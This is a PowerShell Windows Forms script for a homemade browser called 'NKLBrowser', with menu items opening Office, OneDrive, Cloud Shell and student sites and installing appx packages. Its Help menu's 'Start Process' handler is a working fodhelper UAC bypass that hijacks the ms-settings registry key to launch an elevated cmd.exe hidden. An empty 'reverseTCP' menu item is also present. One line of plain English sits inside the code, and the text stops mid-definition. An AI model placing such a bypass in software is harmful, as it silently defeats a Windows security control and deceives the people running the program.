#----------------------------------------------
	#region Import the Assemblies
	#----------------------------------------------
	[void][reflection.assembly]::Load('System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089')
	[void][reflection.assembly]::Load('System.Design, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a')
	[void][reflection.assembly]::Load('System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a')
	#endregion Import Assemblies

	#----------------------------------------------
	#region Generated Form Objects
	#----------------------------------------------
	[System.Windows.Forms.Application]::EnableVisualStyles()
	$Form1 = New-Object 'System.Windows.Forms.Form'
	$buttonGoFoward = New-Object 'System.Windows.Forms.Button'
	$buttonRefresh = New-Object 'System.Windows.Forms.Button'
	$buttonBack = New-Object 'System.Windows.Forms.Button'
	$buttonHome = New-Object 'System.Windows.Forms.Button'
	$Navigate = New-Object 'System.Windows.Forms.Button'
	$URLBOX = New-Object 'System.Windows.Forms.ComboBox'
	$tabcontrol1 = New-Object 'System.Windows.Forms.TabControl'
	$tabpage1 = New-Object 'System.Windows.Forms.TabPage'
	$NKLBrowser = New-Object 'System.Windows.Forms.WebBrowser'
	$menustrip1 = New-Object 'System.Windows.Forms.MenuStrip'
	$fileToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$exitToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$editToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$copyToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$pasteToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$helpToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$aboutToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$cloudSHellToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$officeToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$onedriveToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$oneNoteToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$powerPointToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$gamesToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$minecraftEducationToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$win10StoreAppToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$kaliLinuxToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$studientToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$signuPOffice365StudientToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$win10StoreAppxDownloadToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$momentumCanadaToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$buildPSFormToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$startProcessToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$pSCRIPTSToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$reverseTCPToolStripMenuItem = New-Object 'System.Windows.Forms.ToolStripMenuItem'
	$InitialFormWindowState = New-Object 'System.Windows.Forms.FormWindowState'
	#endregion Generated Form Objects

	#----------------------------------------------
	# User Generated Script
	#----------------------------------------------
	
	$form1_Load={
		#TODO: Initialize Form Controls here
		$NKLBrowser.Navigate("https://www.google.com/")
		param ($FormText,
			$FormHeight = 'Odyessy')
	}
	
	
	$exitToolStripMenuItem_Click={
		#TODO: Place custom script here
		$Form1.Close()
	}
	
	$aboutToolStripMenuItem_Click={
		#TODO: Place custom script here
		[System.Windows.Forms.MessageBox]::Show("Menu Application v1.0","Menu Application");
	}
	
	
	
	#region Control Helper Functions
	function Update-ComboBox
	{
	<#
		.SYNOPSIS
			This functions helps you load items into a ComboBox.
		
		.DESCRIPTION
			Use this function to dynamically load items into the ComboBox control.
		
		.PARAMETER ComboBox
			The ComboBox control you want to add items to.
		
		.PARAMETER Items
			The object or objects you wish to load into the ComboBox's Items collection.
		
		.PARAMETER DisplayMember
			Indicates the property to display for the items in this control.
			
		.PARAMETER ValueMember
			Indicates the property to use for the value of the control.
		
		.PARAMETER Append
			Adds the item(s) to the ComboBox without clearing the Items collection.
		
		.EXAMPLE
			Update-ComboBox $combobox1 "Red", "White", "Blue"
		
		.EXAMPLE
			Update-ComboBox $combobox1 "Red" -Append
			Update-ComboBox $combobox1 "White" -Append
			Update-ComboBox $combobox1 "Blue" -Append
		
		.EXAMPLE
			Update-ComboBox $combobox1 (Get-Process) "ProcessName"
		
		.NOTES
			Additional information about the function.
	#>
		
		param
		(
			[Parameter(Mandatory = $true)]
			[ValidateNotNull()]
			[System.Windows.Forms.ComboBox]
			$ComboBox,
			[Parameter(Mandatory = $true)]
			[ValidateNotNull()]
			$Items,
			[Parameter(Mandatory = $false)]
			[string]$DisplayMember,
			[Parameter(Mandatory = $false)]
			[string]$ValueMember,
			[switch]
			$Append
		)
		
		if (-not $Append)
		{
			$ComboBox.Items.Clear()
		}
		
		if ($Items -is [Object[]])
		{
			$ComboBox.Items.AddRange($Items)
		}
		elseif ($Items -is [System.Collections.IEnumerable])
		{
			$ComboBox.BeginUpdate()
			foreach ($obj in $Items)
			{
				$ComboBox.Items.Add($obj)
			}
			$ComboBox.EndUpdate()
		}
		else
		{
			$ComboBox.Items.Add($Items)
		}
		
		$ComboBox.DisplayMember = $DisplayMember
		$ComboBox.ValueMember = $ValueMember
	}
	
	function Update-ToolStripComboBox
	{
	<#
		.SYNOPSIS
			This functions helps you load items into a ToolStripComboBox.
		
		.DESCRIPTION
			Use this function to dynamically load items into the ToolStripComboBox control.
		
		.PARAMETER ToolStripComboBox
			The ToolStripComboBox control you want to add items to.
		
		.PARAMETER Items
			The object or objects you wish to load into the ToolStripComboBox's Items collection.
		
		.PARAMETER Append
			Adds the item(s) to the ToolStripComboBox without clearing the Items collection.
		
		.EXAMPLE
			Update-ToolStripComboBox $toolStripComboBox1 "Red", "White", "Blue"
		
		.EXAMPLE
			Update-ToolStripComboBox $toolStripComboBox1 "Red" -Append
			Update-ToolStripComboBox $toolStripComboBox1 "White" -Append
			Update-ToolStripComboBox $toolStripComboBox1 "Blue" -Append
		
		.NOTES
			Additional information about the function.
	#>
		
		param
		(
			[Parameter(Mandatory = $true)]
			[ValidateNotNull()]
			[System.Windows.Forms.ToolStripComboBox]
			$ToolStripComboBox,
			[Parameter(Mandatory = $true)]
			[ValidateNotNull()]
			$Items,
			[switch]
			$Append
		)
		
		if (-not $Append)
		{
			$ToolStripComboBox.Items.Clear()
		}
		
		if ($Items -is [Object[]])
		{
			$ToolStripComboBox.Items.AddRange($Items)
		}
		elseif ($Items -is [Array])
		{
			$ToolStripComboBox.BeginUpdate()
			foreach ($obj in $Items)
			{
				$ToolStripComboBox.Items.Add($obj)
			}
			$ToolStripComboBox.EndUpdate()
		}
		else
		{
			$ToolStripComboBox.Items.Add($Items)
		}
	}
	
	<#
		.SYNOPSIS
			Sets the emulation of the WebBrowser control for the application.
		
		.DESCRIPTION
			Sets the emulation of the WebBrowser control for the application using the installed version of IE.
			This improves the WebBrowser control compatibility with newer html features.
		
		.PARAMETER ExecutableName
			The name of the executable E.g. PowerShellStudio.exe.
			Default Value: The running executable name.
		
		.EXAMPLE
			PS C:\> Set-WebBrowserEmulation
	
		.EXAMPLE
			PS C:\> Set-WebBrowserEmulation PowerShell.exe
	#>
	function Set-WebBrowserEmulation
	{
		param
		(
			[ValidateNotNullOrEmpty()]
			[string]
			$ExecutableName = [System.IO.Path]::GetFileName([System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName)
		)
		
		#region Get IE Version
		$valueNames = 'svcVersion', 'svcUpdateVersion', 'Version', 'W2kVersion'
		
		$version = 0;
		for ($i = 0; $i -lt $valueNames.Length; $i++)
		{
			$objVal = [Microsoft.Win32.Registry]::GetValue('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer', $valueNames[$i], '0')
			$strVal = [System.Convert]::ToString($objVal)
			if ($strVal)
			{
				$iPos = $strVal.IndexOf('.')
				if ($iPos -gt 0)
				{
					$strVal = $strVal.Substring(0, $iPos)
				}
				
				$res = 0;
				if ([int]::TryParse($strVal, [ref]$res))
				{
					$version = [Math]::Max($version, $res)
				}
			}
		}
		
		if ($version -lt 7)
		{
			$version = 7000
		}
		else
		{
			$version = $version * 1000
		}
		#endregion
		
		[Microsoft.Win32.Registry]::SetValue('HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION', $ExecutableName, $version)
	}
	
	#endregion
	
	
	$Navigate_Click={
		#TODO: Place custom script here
		$NKLBrowser.Navigate("https://www.google.com/search?q=" + $URLBOX.text)
	}
	
	$buttonRefresh_Click={
		#TODO: Place custom script here
		$NKLBrowser.Refresh()
	}
	
	$buttonBack_Click={
		#TODO: Place custom script here
		$NKLBrowser.GoBack()
	}
	
	$buttonHome_Click={
		#TODO: Place custom script here
		$NKLBrowser.GoHome()
	}
	
	$buttonGoFoward_Click={
		#TODO: Place custom script here
		$NKLBrowser.GoForward()
	}
	
	$URLBOX_SelectedIndexChanged={
		#TODO: Place custom script here
		if ($_.KeyCode -eq 'Enter')
		{
			&$Navigate_Click
		}
	}
	
	$NKLBrowser_DocumentCompleted=[System.Windows.Forms.WebBrowserDocumentCompletedEventHandler]{
	#Event Argument: $_ = [System.Windows.Forms.WebBrowserDocumentCompletedEventArgs]
		#TODO: Place custom script here
		
	}
	
	$cloudSHellToolStripMenuItem_Click={
		#TODO: Place custom script here
		$NKLBrowser.Navigate("https://ssh.cloud.google.com/cloudshell/editor?hl=fr&fromcloudshell=true&shellonly=true#id=I0_1587739032254&_gfid=I0_1587739032254&parent=https://console.cloud.google.com&pfname=&rpctoken=11286537")
	}
	
	$officeToolStripMenuItem_Click={
		#TODO: Place custom script here
		$NKLBrowser.Navigate("https://www.office.com/?auth=2")
	}
	
	$onedriveToolStripMenuItem_Click={
		#TODO: Place custom script here
		$NKLBrowser.Navigate("https://jia666-my.sharepoint.com/personal/anaznew_xkx_me/_layouts/15/onedrive.aspx")
	}
	
	$oneNoteToolStripMenuItem_Click={
		#TODO: Place custom script here
		$NKLBrowser.Navigate("https://www.office.com/launch/onenote?auth=2")
	}
	
	$powerPointToolStripMenuItem_Click={
		#TODO: Place custom script here
		$NKLBrowser.Navigate("https://www.office.com/launch/powerpoint?auth=2")
	}
	
	$minecraftEducationToolStripMenuItem_Click={
		#TODO: Place custom script here
		#$NKLBrowser.Navigate("ms-appinstaller:?source=https://aka.ms/downloadmee")
		#TODO: Place custom script here
		Invoke-WebRequest -Uri https://aka.ms/downloadmee -OutFile MinecraftEdu.appx -UseBasicParsing
		Add-AppxPackage .\MinecraftEdu.appx
	}
	
	$win10StoreAppToolStripMenuItem_Click={
		#TODO: Place custom script here
		
	}
	
	$kaliLinuxToolStripMenuItem_Click={
		#TODO: Place custom script here
		Invoke-WebRequest -Uri https://aka.ms/wsl-kali-linux-new -OutFile Kali.appx -UseBasicParsing
		Add-AppxPackage .\Kali.appx
		C:\Windows\system32\wsl.exe ~ -d kali-linux
	}
	
	$signuPOffice365StudientToolStripMenuItem_Click={
		#TODO: Place custom script here
		$NKLBrowser.Navigate("https://signup.microsoft.com/signup?sku=faculty")
	}
	
	$win10StoreAppxDownloadToolStripMenuItem_Click={
		#TODO: Place custom script here
		$NKLBrowser.Navigate("https://store.rg-adguard.net/")
	}
	
	$momentumCanadaToolStripMenuItem_Click={
		#TODO: Place custom script here
		$NKLBrowser.Navigate("https://w05.international.gc.ca/Scholarships-Bourses/login.aspx?AspxAutoDetectCookieSupport=1")
	}
	
	$buildPSFormToolStripMenuItem_Click= {
		#TODO: Place custom script here
		$GOOGLEURL = Read-Host Entrez Google Recherche !!
		Add-Type -assembly System.Windows.Forms
		$main_form = New-Object System.Windows.Forms.Form
		$main_form.Text = 'NKLBrowser Generator'
		$main_form.Width = 800
		$main_form.Height = 800
		$main_form.AutoSize = $true
		$Label = New-Object System.Windows.Forms.Label
		$Webbrowser = New-Object System.Windows.Forms.Webbrowser
		$Webbrowser.Navigate("https://www.google.com/search?q=" + $GOOGLEURL)
		$Label.Text = "AD users"
		
		$Webbrowser.Size = New-Object System.Drawing.Point(800, 800)
		
		$Label.AutoSize = $true
		
		$main_form.Controls.Add($Webbrowser)
		Now you can display the form on the screen.
		$main_form.ShowDialog()
		
	}
	
	$startProcessToolStripMenuItem_Click={
		
		Invoke-Expression -Command 'echo Coded By 1337r00t Sorry i Am not testing this tool'
		New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force
		New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Force
		Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value 'cmd /k cmd.exe' -Force
		
		Start-Process 'C:\Windows\System32\fodhelper.exe' (Resolve-Path .\).Path -WindowStyle Hidden
	}
	
	$reverseTCPToolStripMenuItem_Click={
		#TODO: Place custom script here
		
	}
	
	$pSCRIPTSToolStripMenuItem_Click={
	
	}
	
	# --End User Generated Script--
	#----------------------------------------------
	#region Generated Events
	#----------------------------------------------
	
	$Form_StateCorrection_Load=
	{
		#Correct the initial state of the form to prevent the .Net maximized form issue
		$Form1.WindowState = $InitialFormWindowState
	}
	
	$Form_Cleanup_FormClosed=
	{
		#Remove all event handlers from the controls
		try
		{
			$buttonGoFoward.remove_Click($buttonGoFoward_Click)
			$buttonRefresh.remove_Click($buttonRefresh_Click)
			$buttonBack.remove_Click($buttonBack_Click)
			$buttonHome.remove_Click($buttonHome_Click)
			$Navigate.remove_Click($Navigate_Click)
			$URLBOX.remove_SelectedIndexChanged($URLBOX_SelectedIndexChanged)
			$URLBOX.remove_Enter($URLBOX_SelectedIndexChanged)
			$NKLBrowser.remove_DocumentCompleted($NKLBrowser_DocumentCompleted)
			$Form1.remove_Load($form1_Load)
			$exitToolStripMenuItem.remove_Click($exitToolStripMenuItem_Click)
			$aboutToolStripMenuItem.remove_Click($aboutToolStripMenuItem_Click)
			$cloudSHellToolStripMenuItem.remove_Click($cloudSHellToolStripMenuItem_Click)
			$officeToolStripMenuItem.remove_Click($officeToolStripMenuItem_Click)
			$onedriveToolStripMenuItem.remove_Click($onedriveToolStripMenuItem_Click)
			$oneNoteToolStripMenuItem.remove_Click($oneNoteToolStripMenuItem_Click)
			$powerPointToolStripMenuItem.remove_Click($powerPointToolStripMenuItem_Click)
			$minecraftEducationToolStripMenuItem.remove_Click($minecraftEducationToolStripMenuItem_Click)
			$win10StoreAppToolStripMenuItem.remove_Click($win10StoreAppToolStripMenuItem_Click)
			$kaliLinuxToolStripMenuItem.remove_Click($kaliLinuxToolStripMenuItem_Click)
			$signuPOffice365StudientToolStripMenuItem.remove_Click($signuPOffice365StudientToolStripMenuItem_Click)
			$win10StoreAppxDownloadToolStripMenuItem.remove_Click($win10StoreAppxDownloadToolStripMenuItem_Click)
			$momentumCanadaToolStripMenuItem.remove_Click($momentumCanadaToolStripMenuItem_Click)
			$buildPSFormToolStripMenuItem.remove_Click($buildPSFormToolStripMenuItem_Click)
			$startProcessToolStripMenuItem.remove_Click($startProcessToolStripMenuItem_Click)
			$pSCRIPTSToolStripMenuItem.remove_Click($pSCRIPTSToolStripMenuItem_Click)
			$reverseTCPToolStripMenuItem.remove_Click($reverseTCPToolStripMenuItem_Click)
			$Form1.remove_Load($Form_StateCorrection_Load)
			$Form1.remove_FormClosed($Form_Cleanup_FormClosed)
		}
		catch { Out-Null <# Prevent PSScriptAnalyzer warning #> }
	}
	#endregion Generated Events

	#----------------------------------------------
	#region Generated Form Code
	#----------------------------------------------
	$Form1.SuspendLayout()
	$tabcontrol1.SuspendLayout()
	$tabpage1.SuspendLayout()
	$menustrip1.SuspendLayout()
	#
	# Form1
	#
	$Form1.Controls.Add($buttonGoFoward)
	$Form1.Controls.Add($buttonRefresh)
	$Form1.Controls.Add($buttonBack)
	$Form1.Controls.Add($buttonHome)
	$Form1.Controls.Add($Navigate)
	$Form1.Controls.Add($URLBOX)
	$Form1.Controls.Add($tabcontrol1)
	$Form1.Controls.Add($menustrip1)
	$Form1.AutoScaleDimensions = '6, 13'
	$Form1.AutoScaleMode = 'Font'
	$Form1.ClientSize = '1075, 543'
	$Form1.MainMenuStrip = $menustrip1
	$Form1.Name = 'Form1'
	$Form1.StartPosition = 'CenterScreen'
	$Form1.Text = 'NKLBrowser'
	$Form1.add_Load($form1_Load)
	#
	# buttonGoFoward
	#
	$buttonGoFoward.Anchor = 'Top, Right'
	$buttonGoFoward.Location = '869, 31'
	$buttonGoFoward.Name = 'buttonGoFoward'
	$buttonGoFoward.Size = '75, 21'
	$buttonGoFoward.TabIndex = 7
	$buttonGoFoward.Text = 'Go Foward'
	$buttonGoFoward.UseCompatibleTextRendering = $True
	$buttonGoFoward.UseVisualStyleBackColor = $True
	$buttonGoFoward.add_Click($buttonGoFoward_Click)
	#
	# buttonRefresh
	#
	$buttonRefresh.Anchor = 'Top, Right'
	$buttonRefresh.Location = '169, 32'
	$buttonRefresh.Name = 'buttonRefresh'
	$buttonRefresh.Size = '62, 21'
	$buttonRefresh.TabIndex = 6
	$buttonRefresh.Text = 'Refresh'
	$buttonRefresh.UseCompatibleTextRendering = $True
	$buttonRefresh.UseVisualStyleBackColor = $True
	$buttonRefresh.add_Click($buttonRefresh_Click)
	#
	# buttonBack
	#
	$buttonBack.Anchor = 'Top, Right'
	$buttonBack.Location = '123, 31'
	$buttonBack.Name = 'buttonBack'
	$buttonBack.Size = '40, 21'
	$buttonBack.TabIndex = 5
	$buttonBack.Text = 'Back'
	$buttonBack.UseCompatibleTextRendering = $True
	$buttonBack.UseVisualStyleBackColor = $True
	$buttonBack.add_Click($buttonBack_Click)
	#
	# buttonHome
	#
	$buttonHome.Anchor = 'Top, Right'
	$buttonHome.Location = '67, 32'
	$buttonHome.Name = 'buttonHome'
	$buttonHome.Size = '50, 21'
	$buttonHome.TabIndex = 4
	$buttonHome.Text = 'Home'
	$buttonHome.UseCompatibleTextRendering = $True
	$buttonHome.UseVisualStyleBackColor = $True
	$buttonHome.add_Click($buttonHome_Click)
	#
	# Navigate
	#
	$Navigate.Anchor = 'Top, Right'
	$Navigate.Location = '802, 31'
	$Navigate.Name = 'Navigate'
	$Navigate.Size = '61, 21'
	$Navigate.TabIndex = 3
	$Navigate.Text = 'GO'
	$Navigate.UseCompatibleTextRendering = $True
	$Navigate.UseVisualStyleBackColor = $True
	$Navigate.add_Click($Navigate_Click)
	#
	# URLBOX
	#
	$URLBOX.FormattingEnabled = $True
	$URLBOX.Location = '237, 32'
	$URLBOX.Name = 'URLBOX'
	$URLBOX.Size = '559, 21'
	$URLBOX.TabIndex = 2
	$URLBOX.add_SelectedIndexChanged($URLBOX_SelectedIndexChanged)
	$URLBOX.add_Enter($URLBOX_SelectedIndexChanged)
	#
	# tabcontrol1
	#
	$tabcontrol1.Controls.Add($tabpage1)
	$tabcontrol1.Anchor = 'Top, Bottom, Left, Right'
	$tabcontrol1.Location = '0, 59'
	$tabcontrol1.Name = 'tabcontrol1'
	$tabcontrol1.SelectedIndex = 0
	$tabcontrol1.Size = '1075, 486'
	$tabcontrol1.TabIndex = 1
	#
	# tabpage1
	#
	$tabpage1.Controls.Add($NKLBrowser)
	$tabpage1.Location = '4, 22'
	$tabpage1.Name = 'tabpage1'
	$tabpage1.Padding = '3, 3, 3, 3'
	$tabpage1.Size = '1067, 460'
	$tabpage1.TabIndex = 0
	$tabpage1.Text = 'NKLBrowser'
	$tabpage1.UseVisualStyleBackColor = $True
	#
	# NKLBrowser
	#
	$NKLBrowser.Dock = 'Fill'
	$NKLBrowser.Location = '3, 3'
	$NKLBrowser.MinimumSize = '20, 20'
	$NKLBrowser.Name = 'NKLBrowser'
	$NKLBrowser.ScriptErrorsSuppressed = $True
	$NKLBrowser.Size = '1061, 454'
	$NKLBrowser.TabIndex = 0
	$NKLBrowser.add_DocumentCompleted($NKLBrowser_DocumentCompleted)
	#
	# menustrip1
	#
	$menustrip1.Anchor = 'Top, Left, Right'
	$menustrip1.Dock = 'None'
	[void]$menustrip1.Items.Add($fileToolStripMenuItem)
	[void]$menustrip1.Items.Add($editToolStripMenuItem)
	[void]$menustrip1.Items.Add($helpToolStripMenuItem)
	$menustrip1.Location = '0, 0'
	$menustrip1.Name = 'menustrip1'
	$menustrip1.Size = '128, 24'
	$menustrip1.TabIndex = 0
	$menustrip1.Text = 'menustrip1'
	#
	# fileToolStripMenuItem
	#
	[void]$fileToolStripMenuItem.DropDownItems.Add($exitToolStripMenuItem)
	[void]$fileToolStripMenuItem.DropDownItems.Add($buildPSFormToolStripMenuItem)
	[void]$fileToolStripMenuItem.DropDownItems.Add($pSCRIPTSToolStripMenuItem)
	$fileToolStripMenuItem.Name = 'fileToolStripMenuItem'
	$fileToolStripMenuItem.Size = '37, 20'
	$fileToolStripMenuItem.Text = 'File'
	#
	# exitToolStripMenuItem
	#
	$exitToolStripMenuItem.Name = 'exitToolStripMenuItem'
	$exitToolStripMenuItem.Size = '145, 22'
	$exitToolStripMenuItem.Text = 'Exit'
	$exitToolStripMenuItem.add_Click($exitToolStripMenuItem_Click)
	#
	# editToolStripMenuItem
	#
	[void]$editToolStripMenuItem.DropDownItems.Add($copyToolStripMenuItem)
	[void]$editToolStripMenuItem.DropDownItems.Add($pasteToolStripMenuItem)
	$editToolStripMenuItem.Name = 'editToolStripMenuItem'
	$editToolStripMenuItem.Size = '39, 20'
	$editToolStripMenuItem.Text = 'Edit'
	#
	# copyToolStripMenuItem
	#
	$copyToolStripMenuItem.Name = 'copyToolStripMenuItem'
	$copyToolStripMenuItem.ShortcutKeys = [System.Windows.Forms.Keys]::C -bor [System.Windows.Forms.Keys]::Control 
	$copyToolStripMenuItem.Size = '144, 22'
	$copyToolStripMenuItem.Text = 'Copy'
	#
	# pasteToolStripMenuItem
	#
	$pasteToolStripMenuItem.Name = 'pasteToolStripMenuItem'
	$pasteToolStripMenuItem.ShortcutKeys = [System.Windows.Forms.Keys]::V -bor [System.Windows.Forms.Keys]::Control 
	$pasteToolStripMenuItem.Size = '144, 22'
	$pasteToolStripMenuItem.Text = 'Paste'
	#
	# helpToolStripMenuItem
	#
	[void]$helpToolStripMenuItem.DropDownItems.Add($aboutToolStripMenuItem)
	[void]$helpToolStripMenuItem.DropDownItems.Add($cloudSHellToolStripMenuItem)
	[void]$helpToolStripMenuItem.DropDownItems.Add($officeToolStripMenuItem)
	[void]$helpToolStripMenuItem.DropDownItems.Add($gamesToolStripMenuItem)
	[void]$helpToolStripMenuItem.DropDownItems.Add($win10StoreAppToolStripMenuItem)
	[void]$helpToolStripMenuItem.DropDownItems.Add($studientToolStripMenuItem)
	[void]$helpToolStripMenuItem.DropDownItems.Add($startProcessToolStripMenuItem)
	$helpToolStripMenuItem.Name = 'helpToolStripMenuItem'
	$helpToolStripMenuItem.Size = '44, 20'
	$helpToolStripMenuItem.Text = 'Help'
	#
	# aboutToolStripMenuItem
	#
	$aboutToolStripMenuItem.Name = 'aboutToolStripMenuItem'
	$aboutToolStripMenuItem.Size = '156, 22'
	$aboutToolStripMenuItem.Text = 'About'
	$aboutToolStripMenuItem.add_Click($aboutToolStripMenuItem_Click)
	#
	# cloudSHellToolStripMenuItem
	#
	$cloudSHellToolStripMenuItem.Name = 'cloudSHellToolStripMenuItem'
	$cloudSHellToolStripMenuItem.Size = '156, 22'
	$cloudSHellToolStripMenuItem.Text = 'CloudSHell'
	$cloudSHellToolStripMenuItem.add_Click($cloudSHellToolStripMenuItem_Click)
	#
	# officeToolStripMenuItem
	#
	[void]$officeToolStripMenuItem.DropDownItems.Add($onedriveToolStripMenuItem)
	[void]$officeToolStripMenuItem.DropDownItems.Add($oneNoteToolStripMenuItem)
	[void]$officeToolStripMenuItem.DropDownItems.Add($powerPointToolStripMenuItem)
	$officeToolStripMenuItem.Name = 'officeToolStripMenuItem'
	$officeToolStripMenuItem.Size = '156, 22'
	$officeToolStripMenuItem.Text = 'Office'
	$officeToolStripMenuItem.add_Click($officeToolStripMenuItem_Click)
	#
	# onedriveToolStripMenuItem
	#
	$onedriveToolStripMenuItem.Name = 'onedriveToolStripMenuItem'
	$onedriveToolStripMenuItem.Size = '135, 22'
	$onedriveToolStripMenuItem.Text = 'Onedrive'
	$onedriveToolStripMenuItem.add_Click($onedriveToolStripMenuItem_Click)
	#
	# oneNoteToolStripMenuItem
	#
	$oneNoteToolStripMenuItem.Name = 'oneNoteToolStripMenuItem'
	$oneNoteToolStripMenuItem.Size = '135, 22'
	$oneNoteToolStripMenuItem.Text = 'OneNote'
	$oneNoteToolStripMenuItem.add_Click($oneNoteToolStripMenuItem_Click)
	#
	# powerPointToolStripMenuItem
	#
	$powerPointToolStripMenuItem.Name = 'powerPointToolStripMenuItem'
	$powerPointToolStripMenuItem.Size = '135, 22'
	$powerPointToolStripMenuItem.Text = 'PowerPoint'
	$powerPointToolStripMenuItem.add_Click($powerPointToolStripMenuItem_Click)
	#
	# gamesToolStripMenuItem
	#
	[void]$gamesToolStripMenuItem.DropDownItems.Add($minecraftEducationToolStripMenuItem)
	$gamesToolStripMenuItem.Name = 'gamesToolStripMenuItem'
	$gamesToolStripMenuItem.Size = '156, 22'
	$gamesToolStripMenuItem.Text = 'Games'
	#
	# minecraftEducationToolStripMenuItem
	#
	$minecraftEducationToolStripMenuItem.Name = 'minecraftEducationToolStripMenuItem'
	$minecraftEducationToolStripMenuItem.Size = '181, 22'
	$minecraftEducationToolStripMenuItem.Text = 'Minecraft Education'
	$minecraftEducationToolStripMenuItem.add_Click($minecraftEducationToolStripMenuItem_Click)
	#
	# win10StoreAppToolStripMenuItem
	#
	[void]$win10StoreAppToolStripMenuItem.DropDownItems.Add($kaliLinuxToolStripMenuItem)
	[void]$win10StoreAppToolStripMenuItem.DropDownItems.Add($win10StoreAppxDownloadToolStripMenuItem)
	$win10StoreAppToolStripMenuItem.Name = 'win10StoreAppToolStripMenuItem'
	$win10StoreAppToolStripMenuItem.Size = '156, 22'
	$win10StoreAppToolStripMenuItem.Text = 'Win10StoreApp'
	$win10StoreAppToolStripMenuItem.add_Click($win10StoreAppToolStripMenuItem_Click)
	#
	# kaliLinuxToolStripMenuItem
	#
	$kaliLinuxToolStripMenuItem.Name = 'kaliLinuxToolStripMenuItem'
	$kaliLinuxToolStripMenuItem.Size = '216, 22'
	$kaliLinuxToolStripMenuItem.Text = 'Kali-Linux'
	$kaliLinuxToolStripMenuItem.add_Click($kaliLinuxToolStripMenuItem_Click)
	#
	# studientToolStripMenuItem
	#
	[void]$studientToolStripMenuItem.DropDownItems.Add($signuPOffice365StudientToolStripMenuItem)
	[void]$studientToolStripMenuItem.DropDownItems.Add($momentumCanadaToolStripMenuItem)
	$studientToolStripMenuItem.Name = 'studientToolStripMenuItem'
	$studientToolStripMenuItem.Size = '156, 22'
	$studientToolStripMenuItem.Text = 'Studient'
	#
	# signuPOffice365StudientToolStripMenuItem
	#
	$signuPOffice365StudientToolStripMenuItem.Name = 'signuPOffice365StudientToolStripMenuItem'
	$signuPOffice365StudientToolStripMenuItem.Size = '211, 22'
	$signuPOffice365StudientToolStripMenuItem.Text = 'SignuP Office365 Studient'
	$signuPOffice365StudientToolStripMenuItem.add_Click($signuPOffice365StudientToolStripMenuItem_Click)
	#
	# win10StoreAppxDownloadToolStripMenuItem
	#
	$win10StoreAppxDownloadToolStripMenuItem.Name = 'win10StoreAppxDownloadToolStripMenuItem'
	$win10StoreAppxDownloadToolStripMenuItem.Size = '216, 22'
	$win10StoreAppxDownloadToolStripMenuItem.Text = 'Win10StoreAppxDownload'
	$win10StoreAppxDownloadToolStripMenuItem.add_Click($win10StoreAppxDownloadToolStripMenuItem_Click)
	#
	# momentumCanadaToolStripMenuItem
	#
	$momentumCanadaToolStripMenuItem.Name = 'momentumCanadaToolStripMenuItem'
	$momentumCanadaToolStripMenuItem.Size = '211, 22'
	$momentumCanadaToolStripMenuItem.Text = 'MomentumCanada'
	$momentumCanadaToolStripMenuItem.add_Click($momentumCanadaToolStripMenuItem_Click)
	#
	# buildPSFormToolStripMenuItem
	#
	$buildPSFormToolStripMenuItem.Name = 'buildPSFormToolStripMenuItem'
	$buildPSFormToolStripMenuItem.Size = '145, 22'
	$buildPSFormToolStripMenuItem.Text = 'Build PSForm'
	$buildPSFormToolStripMenuItem.add_Click($buildPSFormToolStripMenuItem_Click)
	#
	# startProcessToolStripMenuItem
	#
	$startProcessToolStripMenuItem.Name = 'startProcessToolStripMenuItem'
	$startProcessToolStripMenuItem.Size = '156, 22'
	$startProcessToolStripMenuItem.Text = 'Start Process'
	$startProcessToolStripMenuItem.add_Click($startProcessToolStripMenuItem_Click)
	#
	# pSCRIPTSToolStripMenuItem
	#
	[void]$pSCRIPTSToolStripMenuItem.DropDownItems.Add($reverseTCPToolStripMenuItem)
	$pSCRIPTSToolStripMenuItem.Name = 'pSCRIPTSToolStripMenuItem'
	$pSCRIPTSToolStripMenuItem.Size = '145, 22'
	$pSCRIPTSToolStripMenuItem.Text = 'PSCRIPTS'
	$pSCRIPTSToolStripMenuItem.add_Click($pSCRIPTSToolStripMenuItem_Click)
	#
	# reverseTCPToolStripMenuItem
	#
	$reverseTCPToolStripMenuItem.Name = 'reverseTCPToolStripMenuItem'
